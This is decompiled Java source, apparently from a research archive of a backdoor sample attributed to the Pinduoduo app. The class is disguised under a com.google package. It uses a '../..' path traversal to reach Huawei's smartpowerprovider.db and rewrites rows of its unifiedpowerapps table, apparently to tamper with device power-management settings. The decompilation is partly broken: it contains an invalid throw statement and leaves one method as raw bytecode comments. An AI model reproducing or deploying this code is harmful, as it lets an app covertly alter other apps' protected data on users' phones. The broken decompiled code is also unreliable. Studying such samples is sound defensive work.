package com.google.android.sd.biz_dynamic_dex.hw_power_update;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.google.android.sd.biz_dynamic_dex.base.DynamicUtils;
import com.google.android.sd.biz_dynamic_dex.hw_db_handler.HwDBHandler;
import com.google.android.sd.biz_dynamic_dex.hw_db_handler.ManagerPkgGetOnHw;
import java.io.Closeable;
import org.json.JSONObject;

public class DbUtil {
  private static final String DB_PATH_FORMAT = "/data/data/%s/../../user_de/0/%s/databases";
  
  private static final String DB_SUFFIX = "smartpowerprovider.db";
  
  private static final String INTELLIGENT_FILE_PREFIX = "/data/data/com.huawei.intelligent/files/dqtmppu";
  
  private static final String TABLE_NAME = "unifiedpowerapps";
  
  public static HwDBHandler generateDBHandler(Context paramContext) {
    return new HwDBHandler(paramContext, getFilePath(paramContext), "/data/data/com.huawei.intelligent/files/dqtmppu", "smartpowerprovider.db");
  }
  
  private static String getFilePath(Context paramContext) {
    String str = ManagerPkgGetOnHw.getManagerPkgName(paramContext);
    return String.format("/data/data/%s/../../user_de/0/%s/databases", new Object[] { str, str });
  }
  
  static JSONObject queryAllValueFromDb(SQLiteDatabase paramSQLiteDatabase, String paramString) {
    JSONObject jSONObject = new JSONObject();
    Cursor cursor2 = null;
    Cursor cursor1 = null;
    int i = 0;
    try {
      Cursor cursor = paramSQLiteDatabase.query("unifiedpowerapps", null, "pkg_name = ?", new String[] { paramString }, null, null, null);
      if (cursor != null) {
        cursor1 = cursor;
        cursor2 = cursor;
        if (cursor.getCount() == 1) {
          cursor1 = cursor;
          cursor2 = cursor;
          cursor.moveToFirst();
          cursor1 = cursor;
          cursor2 = cursor;
          String[] arrayOfString = cursor.getColumnNames();
          cursor1 = cursor;
          cursor2 = cursor;
          int j = arrayOfString.length;
          while (i < j) {
            String str = arrayOfString[i];
            cursor1 = cursor;
            cursor2 = cursor;
            jSONObject.put(str, cursor.getLong(cursor.getColumnIndex(str)));
            i++;
          } 
          DynamicUtils.safetyClose((Closeable)cursor);
          return jSONObject;
        } 
      } 
      cursor1 = cursor;
      cursor2 = cursor;
      jSONObject.put("query_error_msg", "cursor_null_or_empty");
      DynamicUtils.safetyClose((Closeable)cursor);
      return jSONObject;
    } catch (Exception exception) {
      cursor1 = cursor2;
      try {
        StringBuilder stringBuilder = new StringBuilder();
        cursor1 = cursor2;
        stringBuilder.append("error_");
        cursor1 = cursor2;
        stringBuilder.append(exception.getMessage());
        cursor1 = cursor2;
        jSONObject.put("query_error_msg", stringBuilder.toString());
      } catch (Exception exception1) {}
    } finally {}
    DynamicUtils.safetyClose((Closeable)cursor1);
    throw paramSQLiteDatabase;
  }
  
  static String updateDb(SQLiteDatabase paramSQLiteDatabase, ContentValues paramContentValues, String paramString) {
    // Byte code:
    //   0: aconst_null
    //   1: astore #7
    //   3: aconst_null
    //   4: astore #5
    //   6: aload_0
    //   7: ldc 'unifiedpowerapps'
    //   9: aconst_null
    //   10: ldc 'pkg_name = ?'
    //   12: iconst_1
    //   13: anewarray java/lang/String
    //   16: dup
    //   17: iconst_0
    //   18: aload_2
    //   19: aastore
    //   20: aconst_null
    //   21: aconst_null
    //   22: aconst_null
    //   23: invokevirtual query : (Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   26: astore #6
    //   28: aload #6
    //   30: ifnull -> 65
    //   33: aload #6
    //   35: invokeinterface getCount : ()I
    //   40: ifle -> 65
    //   43: aload_0
    //   44: ldc 'unifiedpowerapps'
    //   46: aload_1
    //   47: ldc 'pkg_name = ?'
    //   49: iconst_1
    //   50: anewarray java/lang/String
    //   53: dup
    //   54: iconst_0
    //   55: aload_2
    //   56: aastore
    //   57: invokevirtual update : (Ljava/lang/String;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I
    //   60: i2l
    //   61: lstore_3
    //   62: goto -> 74
    //   65: aload_0
    //   66: ldc 'unifiedpowerapps'
    //   68: aconst_null
    //   69: aload_1
    //   70: invokevirtual insert : (Ljava/lang/String;Ljava/lang/String;Landroid/content/ContentValues;)J
    //   73: lstore_3
    //   74: aload #6
    //   76: ifnull -> 86
    //   79: aload #6
    //   81: invokeinterface close : ()V
    //   86: lload_3
    //   87: lconst_0
    //   88: lcmp
    //   89: ifle -> 95
    //   92: ldc 'suc'
    //   94: areturn
    //   95: new java/lang/StringBuilder
    //   98: dup
    //   99: invokespecial <init> : ()V
    //   102: astore_0
    //   103: aload_0
    //   104: ldc 'update_fail_'
    //   106: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   109: pop
    //   110: aload_0
    //   111: lload_3
    //   112: invokevirtual append : (J)Ljava/lang/StringBuilder;
    //   115: pop
    //   116: aload_0
    //   117: invokevirtual toString : ()Ljava/lang/String;
    //   120: areturn
    //   121: astore_0
    //   122: goto -> 182
    //   125: astore_1
    //   126: aload #7
    //   128: astore_0
    //   129: aload_0
    //   130: astore #5
    //   132: new java/lang/StringBuilder
    //   135: dup
    //   136: invokespecial <init> : ()V
    //   139: astore_2
    //   140: aload_0
    //   141: astore #5
    //   143: aload_2
    //   144: ldc 'update_fail_'
    //   146: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   149: pop
    //   150: aload_0
    //   151: astore #5
    //   153: aload_2
    //   154: aload_1
    //   155: invokevirtual getMessage : ()Ljava/lang/String;
    //   158: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   161: pop
    //   162: aload_0
    //   163: astore #5
    //   165: aload_2
    //   166: invokevirtual toString : ()Ljava/lang/String;
    //   169: astore_1
    //   170: aload_0
    //   171: ifnull -> 180
    //   174: aload_0
    //   175: invokeinterface close : ()V
    //   180: aload_1
    //   181: areturn
    //   182: aload #5
    //   184: ifnull -> 194
    //   187: aload #5
    //   189: invokeinterface close : ()V
    //   194: aload_0
    //   195: athrow
    //   196: astore_0
    //   197: aload #6
    //   199: astore #5
    //   201: goto -> 182
    //   204: astore_1
    //   205: aload #6
    //   207: astore_0
    //   208: goto -> 129
    // Exception table:
    //   from	to	target	type
    //   6	28	125	java/lang/Exception
    //   6	28	121	finally
    //   33	62	204	java/lang/Exception
    //   33	62	196	finally
    //   65	74	204	java/lang/Exception
    //   65	74	196	finally
    //   132	140	121	finally
    //   143	150	121	finally
    //   153	162	121	finally
    //   165	170	121	finally
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\8c34f5dc-f04c-40ba-98d4-7aa7c364b65c-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\hw_power_update\DbUtil.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */